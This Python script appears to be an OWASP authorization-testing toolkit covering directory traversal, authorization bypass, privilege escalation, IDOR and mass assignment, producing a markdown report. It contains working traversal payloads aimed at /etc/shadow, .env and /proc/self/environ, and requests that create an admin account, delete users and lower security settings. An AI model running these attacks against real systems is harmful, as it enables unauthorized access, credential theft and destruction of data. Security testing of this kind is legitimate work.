#!/usr/bin/env python3
"""
OWASP Authorization Testing Toolkit
Covers OTG-AUTHZ-001 to OTG-AUTHZ-004
Outputs results in SysReptor-compatible markdown format.
"""

import requests
import re
import json
import random
import string
import os
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup

# -----------------------------------------------------------
# Configuration
# -----------------------------------------------------------
TARGET_URL = "http://localhost:8080"  # Change to your target URL
LOGIN_URL = f"{TARGET_URL}/login.php"
USER_PROFILE_URL = f"{TARGET_URL}/profile.php"
ADMIN_DASHBOARD_URL = f"{TARGET_URL}/admin/dashboard.php"
USER_DATA_URL = f"{TARGET_URL}/api/user"  # Example data endpoint

# User credentials
USER_CREDENTIALS = {
    "low_priv": ("testuser", "Password123!"),
    "high_priv": ("admin", "admin123")
}

# Common file paths for traversal
COMMON_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/windows/win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "/proc/self/environ",
    "/.env",
    "/config/database.yml",
    "/WEB-INF/web.xml"
]

# Common traversal sequences
TRAVERSAL_SEQUENCES = [
    "../",
    "..\\",
    "%2e%2e%2f",  # ../
    "%2e%2e/",    # ../
    "..%2f",      # ../
    "%2e%2e%5c",  # ..\
    "..%5c",      # ..\
    "%252e%252e%255c",  # Double encoding
    "....//",      # ....//
    "....\\/",     # ....\/
]

# -----------------------------------------------------------
# Utility Functions
# -----------------------------------------------------------
def banner(msg):
    """Print banner message."""
    print("\n" + "=" * 70)
    print(f"  {msg}")
    print("=" * 70)

def http_request(method, url, data=None, cookies=None, headers=None, allow_redirects=True):
    """Generic HTTP request function."""
    try:
        if method.upper() == "GET":
            response = requests.get(url, params=data, cookies=cookies, headers=headers, 
                                  timeout=10, verify=False, allow_redirects=allow_redirects)
        else:
            response = requests.post(url, data=data, cookies=cookies, headers=headers, 
                                   timeout=10, verify=False, allow_redirects=allow_redirects)
        return response
    except requests.RequestException as e:
        print(f"HTTP error: {e}")
        return None

def login_user(username, password):
    """Login to application and return session cookies."""
    data = {"username": username, "password": password}
    response = http_request("POST", LOGIN_URL, data=data)
    if response and response.status_code == 200 and "logout" in response.text.lower():
        return requests.utils.dict_from_cookiejar(response.cookies)
    return None

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf_token'})
    return csrf_input['value'] if csrf_input else None

def get_user_id_from_profile(content):
    """Extract user ID from profile page content."""
    match = re.search(r'user_id["\']?\s*:\s*["\']?(\d+)', content, re.I)
    return match.group(1) if match else None

def get_objects_from_response(content):
    """Extract potential object references from response content."""
    # Look for IDs, tokens, and filenames in the content
    patterns = [
        r'id["\']?\s*:\s*["\']?(\d+)',
        r'token["\']?\s*:\s*["\']?([a-f0-9]{32})',
        r'file["\']?\s*:\s*["\']?([\w\-]+\.\w{3,4})',
        r'name=["\']object_id["\'] value=["\'](\d+)'
    ]
    
    objects = []
    for pattern in patterns:
        matches = re.findall(pattern, content, re.I)
        objects.extend(matches)
    
    return list(set(objects))

# -----------------------------------------------------------
# Test Functions
# -----------------------------------------------------------
def otg_authz_001():
    """OTG-AUTHZ-001: Testing Directory Traversal/File Include"""
    banner("OTG-AUTHZ-001: Testing Directory Traversal")
    results = {
        "tested_endpoints": {},
        "vulnerable_endpoints": [],
        "vulnerabilities": []
    }
    
    # Get low privilege session
    cookies = login_user(*USER_CREDENTIALS["low_priv"])
    if not cookies:
        return {"error": "Low privilege login failed"}
    
    # Identify endpoints that take file paths
    endpoints = [
        {"name": "Profile Image", "url": f"{TARGET_URL}/load_image.php", "param": "image"},
        {"name": "Document Viewer", "url": f"{TARGET_URL}/view_document.php", "param": "file"},
        {"name": "Template Loader", "url": f"{TARGET_URL}/load_template.php", "param": "template"},
        {"name": "Export Function", "url": f"{TARGET_URL}/export.php", "param": "filename"},
    ]
    
    for endpoint in endpoints:
        results["tested_endpoints"][endpoint["url"]] = []
        
        for file_path in COMMON_FILES:
            for sequence in TRAVERSAL_SEQUENCES:
                # Build traversal path
                traversal_path = sequence * 8 + file_path
                params = {endpoint["param"]: traversal_path}
                
                # Send request
                response = http_request("GET", endpoint["url"], data=params, cookies=cookies)
                
                if response and response.status_code == 200:
                    # Check for signs of successful traversal
                    indicators = [
                        ("/etc/passwd", "root:"),
                        ("win.ini", "[extensions]"),
                        ("hosts", "localhost"),
                        (".env", "APP_KEY="),
                        ("web.xml", "<web-app>")
                    ]
                    
                    for file_indicator, content_indicator in indicators:
                        if file_indicator in file_path and content_indicator in response.text:
                            results["vulnerable_endpoints"].append(endpoint["url"])
                            results["vulnerabilities"].append(
                                f"Directory traversal vulnerability at {endpoint['url']} " 
                                f"with param {endpoint['param']}={traversal_path}"
                            )
                            results["tested_endpoints"][endpoint["url"]].append({
                                "payload": traversal_path,
                                "status": "VULNERABLE",
                                "response_length": len(response.text)
                            })
                            break
                    else:
                        results["tested_endpoints"][endpoint["url"]].append({
                            "payload": traversal_path,
                            "status": "TESTED",
                            "response_length": len(response.text)
                        })
    
    return results

def otg_authz_002():
    """OTG-AUTHZ-002: Testing for Bypassing Authorization Schema"""
    banner("OTG-AUTHZ-002: Testing Authorization Bypass")
    results = {
        "tested_endpoints": [],
        "vulnerabilities": []
    }
    
    # Get low privilege session
    low_cookies = login_user(*USER_CREDENTIALS["low_priv"])
    if not low_cookies:
        return {"error": "Low privilege login failed"}
    
    # Get high privilege session for comparison
    high_cookies = login_user(*USER_CREDENTIALS["high_priv"])
    if not high_cookies:
        return {"error": "High privilege login failed"}
    
    # List of endpoints to test
    endpoints = [
        {"url": ADMIN_DASHBOARD_URL, "name": "Admin Dashboard"},
        {"url": f"{TARGET_URL}/admin/users", "name": "User Management"},
        {"url": f"{TARGET_URL}/admin/config", "name": "Configuration"},
        {"url": f"{TARGET_URL}/api/admin", "name": "Admin API"},
    ]
    
    for endpoint in endpoints:
        results["tested_endpoints"].append(endpoint["url"])
        
        # Access with low privilege
        low_response = http_request("GET", endpoint["url"], cookies=low_cookies)
        
        # Access with high privilege
        high_response = http_request("GET", endpoint["url"], cookies=high_cookies)
        
        # Check if low privilege user can access
        if low_response and low_response.status_code == 200:
            # Compare responses to see if the content is the same
            if high_response and high_response.text and low_response.text == high_response.text:
                results["vulnerabilities"].append(
                    f"Authorization bypass at {endpoint['url']}: "
                    f"Low privilege user accessed admin resource"
                )
            else:
                # Check if the page content indicates access
                if "admin" in low_response.text.lower() or "dashboard" in low_response.text.lower():
                    results["vulnerabilities"].append(
                        f"Authorization bypass at {endpoint['url']}: "
                        f"Low privilege user accessed admin resource"
                    )
    
    # Test HTTP verb tampering
    methods = ["POST", "PUT", "DELETE", "PATCH"]
    for method in methods:
        response = http_request(method, ADMIN_DASHBOARD_URL, cookies=low_cookies)
        if response and response.status_code == 200:
            results["vulnerabilities"].append(
                f"Authorization bypass via HTTP verb tampering ({method}) at {ADMIN_DASHBOARD_URL}"
            )
    
    # Test parameter tampering
    tampered_params = {"role": "admin", "is_admin": "1", "access_level": "999"}
    for param, value in tampered_params.items():
        response = http_request("GET", ADMIN_DASHBOARD_URL, data={param: value}, cookies=low_cookies)
        if response and response.status_code == 200 and "Admin Dashboard" in response.text:
            results["vulnerabilities"].append(
                f"Authorization bypass via parameter tampering ({param}={value}) at {ADMIN_DASHBOARD_URL}"
            )
    
    return results

def otg_authz_003():
    """OTG-AUTHZ-003: Testing for Privilege Escalation"""
    banner("OTG-AUTHZ-003: Testing Privilege Escalation")
    results = {
        "tested_actions": [],
        "vulnerabilities": []
    }
    
    # Login as low privilege user
    cookies = login_user(*USER_CREDENTIALS["low_priv"])
    if not cookies:
        return {"error": "Low privilege login failed"}
    
    # Access profile to get CSRF token
    profile_response = http_request("GET", USER_PROFILE_URL, cookies=cookies)
    if not profile_response:
        return {"error": "Failed to access profile"}
    
    csrf_token = extract_csrf_token(profile_response.text)
    if not csrf_token:
        return {"error": "CSRF token not found"}
    
    # Get user ID from profile
    user_id = get_user_id_from_profile(profile_response.text)
    if not user_id:
        return {"error": "User ID not found"}
    
    # Test 1: Attempt to escalate privileges via profile update
    escalation_data = {
        "user_id": user_id,
        "role": "admin",
        "is_admin": "1",
        "access_level": "100",
        "csrf_token": csrf_token
    }
    
    # Add all parameters from the profile form
    soup = BeautifulSoup(profile_response.text, 'html.parser')
    form = soup.find('form')
    if form:
        for input_tag in form.find_all('input'):
            if input_tag.get('name') and input_tag.get('name') not in escalation_data:
                if input_tag.get('type') == 'hidden':
                    escalation_data[input_tag['name']] = input_tag.get('value', '')
    
    # Submit the update
    response = http_request("POST", USER_PROFILE_URL, data=escalation_data, cookies=cookies)
    
    if response and response.status_code == 200:
        # Check if privileges were escalated
        if "admin" in response.text.lower() or "privilege" in response.text.lower():
            results["vulnerabilities"].append(
                "Privilege escalation via profile update: " 
                "Low privilege user set admin role through form tampering"
            )
    
    # Test 2: Access admin functionality
    admin_functions = [
        {"url": f"{TARGET_URL}/admin/create_user", "method": "POST", "data": {"username": "hacked", "role": "admin"}},
        {"url": f"{TARGET_URL}/admin/delete_user", "method": "POST", "data": {"user_id": "1"}},
        {"url": f"{TARGET_URL}/admin/change_config", "method": "POST", "data": {"setting": "security_level", "value": "0"}}
    ]
    
    for func in admin_functions:
        response = http_request(func["method"], func["url"], data=func["data"], cookies=cookies)
        if response and response.status_code == 200:
            success_indicators = [
                "success", "created", "deleted", "updated", "changed"
            ]
            if any(indicator in response.text.lower() for indicator in success_indicators):
                results["vulnerabilities"].append(
                    f"Privilege escalation: Low privilege user accessed {func['url']} "
                    f"and performed admin action"
                )
    
    # Test 3: API-based privilege escalation
    response = http_request("GET", USER_DATA_URL, cookies=cookies)
    if response and response.status_code == 200:
        # Look for admin endpoints in API response
        admin_endpoints = re.findall(r'"(/admin/\w+)"', response.text)
        for endpoint in admin_endpoints:
            response = http_request("GET", TARGET_URL + endpoint, cookies=cookies)
            if response and response.status_code == 200:
                results["vulnerabilities"].append(
                    f"Privilege escalation: Low privilege user accessed admin API endpoint {endpoint}"
                )
    
    return results

def otg_authz_004():
    """OTG-AUTHZ-004: Testing for Insecure Direct Object References (IDOR)"""
    banner("OTG-AUTHZ-004: Testing Insecure Direct Object References")
    results = {
        "tested_objects": [],
        "vulnerabilities": []
    }
    
    # Login as low privilege user
    low_cookies = login_user(*USER_CREDENTIALS["low_priv"])
    if not low_cookies:
        return {"error": "Low privilege login failed"}
    
    # Get high privilege user ID for comparison
    high_cookies = login_user(*USER_CREDENTIALS["high_priv"])
    if not high_cookies:
        return {"error": "High privilege login failed"}
    
    # Access profile to get user ID
    profile_response = http_request("GET", USER_PROFILE_URL, cookies=low_cookies)
    if not profile_response:
        return {"error": "Failed to access profile"}
    
    low_user_id = get_user_id_from_profile(profile_response.text)
    if not low_user_id:
        return {"error": "User ID not found"}
    
    # Find objects to test (IDs, tokens, etc.)
    objects_to_test = get_objects_from_response(profile_response.text)
    
    # Add common object types to test
    objects_to_test.extend([
        low_user_id, 
        str(int(low_user_id) + 1), 
        str(int(low_user_id) - 1),
        "1",  # Often the first user (admin)
        "0",  # Sometimes special users
        "100", 
        "admin"
    ])
    
    # Identify endpoints that use object references
    endpoints = [
        {"url": f"{TARGET_URL}/api/user", "param": "user_id"},
        {"url": f"{TARGET_URL}/api/documents", "param": "doc_id"},
        {"url": f"{TARGET_URL}/api/orders", "param": "order_id"},
        {"url": f"{TARGET_URL}/api/files", "param": "file_id"},
        {"url": USER_PROFILE_URL, "param": "id"},
    ]
    
    # Test each object in each endpoint
    for obj in objects_to_test:
        for endpoint in endpoints:
            # Build URL with parameter
            url = endpoint["url"]
            params = {endpoint["param"]: obj}
            
            # Send request with low privilege
            response = http_request("GET", url, data=params, cookies=low_cookies)
            
            if response and response.status_code == 200:
                # Check if we accessed data we shouldn't have
                if obj != low_user_id:
                    # Check for sensitive data
                    sensitive_keywords = [
                        "admin", "password", "email", "ssn", "credit", 
                        "card", "address", "phone", "salary"
                    ]
                    
                    if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                        # Verify with high privilege user if it's valid data
                        high_response = http_request("GET", url, data=params, cookies=high_cookies)
                        if high_response and high_response.status_code == 200:
                            results["vulnerabilities"].append(
                                f"IDOR vulnerability: Accessed object {obj} at {url} "
                                f"with parameter {endpoint['param']} as low privilege user"
                            )
                            results["tested_objects"].append({
                                "object": obj,
                                "endpoint": url,
                                "parameter": endpoint["param"],
                                "status": "VULNERABLE",
                                "response_length": len(response.text)
                            })
                            continue
                
                results["tested_objects"].append({
                    "object": obj,
                    "endpoint": url,
                    "parameter": endpoint["param"],
                    "status": "ACCESSED",
                    "response_length": len(response.text)
                })
    
    # Test horizontal privilege escalation
    other_user_id = str(int(low_user_id) + 1)  # Next user ID
    for endpoint in endpoints:
        params = {endpoint["param"]: other_user_id}
        response = http_request("GET", endpoint["url"], data=params, cookies=low_cookies)
        
        if response and response.status_code == 200:
            # Check if we see another user's data
            if other_user_id in response.text and "user" in response.text.lower():
                # Verify it's not our own data
                if low_user_id not in response.text:
                    results["vulnerabilities"].append(
                        f"Horizontal privilege escalation: Accessed user {other_user_id}'s "
                        f"data at {endpoint['url']} with parameter {endpoint['param']}"
                    )
    
    # Test mass assignment
    # First get the profile form
    profile_response = http_request("GET", USER_PROFILE_URL, cookies=low_cookies)
    if profile_response:
        soup = BeautifulSoup(profile_response.text, 'html.parser')
        form = soup.find('form')
        if form:
            form_data = {}
            for input_tag in form.find_all('input'):
                if input_tag.get('name') and input_tag.get('type') != 'submit':
                    form_data[input_tag['name']] = input_tag.get('value', '')
            
            # Add privilege escalation fields
            form_data['role'] = 'admin'
            form_data['is_admin'] = '1'
            form_data['access_level'] = '100'
            
            # Submit the form
            response = http_request("POST", USER_PROFILE_URL, data=form_data, cookies=low_cookies)
            if response and response.status_code == 200:
                if "admin" in response.text.lower() or "privilege" in response.text.lower():
                    results["vulnerabilities"].append(
                        "Mass assignment vulnerability: Set admin role through form submission"
                    )
    
    return results

# -----------------------------------------------------------
# Report Generation
# -----------------------------------------------------------
def generate_report(results, output_file="authorization_testing_report.md"):
    """Generate markdown report in SysReptor format."""
    md = "# Authorization Testing Report\n\n"
    md += f"**Target URL**: {TARGET_URL}\n"
    md += f"**Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    # Summary of findings
    vulnerability_count = sum(1 for test in results.values() if "vulnerabilities" in test and test["vulnerabilities"])
    md += "## Executive Summary\n\n"
    md += f"**Total Tests**: {len(results)}\n"
    md += f"**Vulnerabilities Found**: {vulnerability_count}\n\n"
    
    # Detailed results
    test_order = [
        ("OTG-AUTHZ-001", "Testing Directory Traversal/File Include"),
        ("OTG-AUTHZ-002", "Testing for Bypassing Authorization Schema"),
        ("OTG-AUTHZ-003", "Testing for Privilege Escalation"),
        ("OTG-AUTHZ-004", "Testing for Insecure Direct Object References")
    ]
    
    for test_id, test_name in test_order:
        if test_id not in results:
            continue
            
        md += f"## {test_id}: {test_name}\n\n"
        test_data = results[test_id]
        
        # Show vulnerabilities first
        if "vulnerabilities" in test_data and test_data["vulnerabilities"]:
            md += "### 🚨 Vulnerabilities\n"
            for vuln in test_data["vulnerabilities"]:
                md += f"- {vuln}\n"
            md += "\n"
        else:
            md += "**Status**: ✅ No vulnerabilities found\n\n"
        
        # Show detailed test results
        md += "### Detailed Results\n"
        
        # Special handling for different test types
        if test_id == "OTG-AUTHZ-001":
            for url, tests in test_data.get("tested_endpoints", {}).items():
                md += f"- **Endpoint**: {url}\n"
                for test in tests[:3]:  # Show first 3 tests
                    md += f"  - Payload: `{test['payload']}` ({test['status']}, Length: {test['response_length']})\n"
                if len(tests) > 3:
                    md += f"  - ... and {len(tests)-3} more tests\n"
        
        elif test_id == "OTG-AUTHZ-002":
            for endpoint in test_data.get("tested_endpoints", []):
                md += f"- Tested endpoint: {endpoint}\n"
        
        elif test_id == "OTG-AUTHZ-003":
            for action in test_data.get("tested_actions", []):
                md += f"- Tested action: {action}\n"
        
        elif test_id == "OTG-AUTHZ-004":
            for obj in test_data.get("tested_objects", [])[:5]:  # Show first 5 objects
                status_icon = "🟢" if obj["status"] == "ACCESSED" else "🔴"
                md += f"- {status_icon} Object `{obj['object']}` at {obj['endpoint']}?{obj['parameter']}=... "
                md += f"(Length: {obj['response_length']})\n"
            if len(test_data.get("tested_objects", [])) > 5:
                md += f"- ... and {len(test_data['tested_objects'])-5} more objects tested\n"
        
        # Add raw data for reference
        md += "\n#### Raw Test Data\n```json\n"
        md += json.dumps(test_data, indent=2)
        md += "\n```\n\n"
    
    # Write report
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(md)
    
    return output_file

# -----------------------------------------------------------
# Main Execution
# -----------------------------------------------------------
def main():
    """Main function to run all tests and generate report."""
    results = {}
    
    # Run all tests
    results["OTG-AUTHZ-001"] = otg_authz_001()
    results["OTG-AUTHZ-002"] = otg_authz_002()
    results["OTG-AUTHZ-003"] = otg_authz_003()
    results["OTG-AUTHZ-004"] = otg_authz_004()
    
    # Generate report
    report_file = generate_report(results)
    print(f"\nReport generated: {report_file}")

if __name__ == "__main__":
    main()